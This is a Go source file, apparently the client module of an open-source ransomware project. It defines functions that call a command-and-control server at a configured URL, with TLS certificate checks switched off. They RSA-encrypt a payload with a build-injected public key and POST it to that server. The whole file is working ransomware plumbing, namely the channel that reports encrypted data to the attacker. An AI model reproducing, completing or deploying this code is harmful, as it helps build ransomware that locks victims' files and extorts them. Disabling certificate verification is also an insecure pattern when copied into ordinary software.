package client

import (
	"crypto/tls"
	"net/http"
	"net/url"
	"strings"

	"github.com/mauri870/ransomware/rsa"
	"golang.org/x/net/http2"
)

const (
	SERVER_URL = "https://localhost:8080"
)

var (
	// The public key is automatically injected by make
	PUB_KEY = []byte(`INJECT_PUB_KEY_HERE`)
)

// Call the server
func CallServer(method string, endpoint string, data url.Values) (*http.Response, error) {
	req, err := http.NewRequest(method, SERVER_URL+endpoint, strings.NewReader(data.Encode()))
	if err != nil {
		return new(http.Response), err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{Transport: &http2.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	res, err := client.Do(req)
	if err != nil {
		return new(http.Response), err
	}

	return res, nil
}

// Send an encrypted payload to server
func SendPayload(endpoint, payload string, data url.Values) (*http.Response, error) {
	ciphertext, err := rsa.Encrypt(PUB_KEY, []byte(payload))
	if err != nil {
		return &http.Response{}, err
	}

	data.Add("payload", string(ciphertext))
	return CallServer("POST", endpoint, data)
}
